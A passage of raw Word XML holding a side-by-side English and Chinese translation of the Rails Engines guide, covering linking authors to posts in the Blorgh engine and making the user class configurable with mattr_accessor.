            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rake db:migrate</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5B9CA7B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Now with all the pieces in place, an action will take place that will associate an author — represented by a record in the </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>users</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> table </w:t>
      </w:r>
      <w:del w:id="1" w:author="Unknown">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">- with a post, represented by the </w:delText>
        </w:r>
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:delText>blorgh_posts</w:delText>
        </w:r>
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> table from the engine. 现在所有部分都准备就绪了，一个动作将会发生关联一个作者</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">-被 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>users</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 表中的一条记录表示—与一篇文章，代表来自 engine 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh_posts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> （表记录）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23DBE8E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最后，作者的名称应该被显示在文章页面。添加这个代码在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/blorgh/posts/show.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中的 “Title” 输出的上方：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2760"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="17D118CD" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4681FD2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&lt;p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03DA370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&lt;b&gt;Author:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="657D202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w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>@post.author %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C46EBC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&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4BB1379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对于输出的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@post.author</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>&lt;%=</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 标签，对象的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>to_s</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法将会被调用。（否则）默认情况，这将会相当难看：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2880"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="78D18D04" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="68AE1110" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2028290778"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>#&lt;User:0x00000100ccb3b0&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1A1BDC7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这是是不可取的这里有用户名显示会更好。要这样做添加一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>to_s</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法给应用程序中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="960"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="76B3B798" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="39E5D7E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def</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>to_s</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4198EA3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name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="225D773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6797460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现在作者名显示将会替代丑陋的 Ruby 对象输出。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3165F4C6"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4.4 配置一个 engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6C2A4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This section covers firstly how you can make the </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>user_class</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> setting of the Blorgh engine configurable, followed by general configuration tips for the engine. 本节涵盖首先怎样去设定配置（好的） </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>user_class</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 ‘Blorgh’ engine 的配置，其次是一般 engine 的配置技巧。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="639F5B55"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4.4.1 在应用程序中设定配置文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="737FAEC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The next step is to make the class that represents a </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the application customizable for the engine. This is because, as explained before, that class may not always be </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. To make this customizable, the engine will have a configuration setting called </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>user_class</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> that will be used to specify what the class representing users is inside the application. 下面的步骤是定制相关信息使得应用程序中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类代表 engine（中的作者。这是因为，正如前面解释的，这个类不会一直都是 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。要使的这里可定制，engine 将会有一个配置设置 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>user_class</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 其将会用于指定应用程序的哪个类表示用户。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="046125D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要定义这个配置设置，你需要在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> engine 的模块中使用一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>mattr_accessor</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，位置在 engine 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lib/blorgh.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。在这个模块中输入这行：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3120"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="16E0009A" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1DF68F31" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1515219448"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>mattr_accessor :user_class</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2A83D77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This method works like its brothers </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>attr_accessor</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>cattr_accessor</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, but provides a setter and getter method on the module with the specified name. To use it, it must be referenced using </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh.user_class</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. 它的工作方法就好像 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>attr_accessor</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>cattr_accessor</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，但是在模块中提供了一个 ‘setter’ 和 ‘getter’ 方法给指定的名称。要使用它，它必须引用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh.user_class</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EED703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接下来是打开 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh::Post</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 开关到这个新的设置。对于这个 ‘model’ (</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/models/blorgh/post.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">)的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
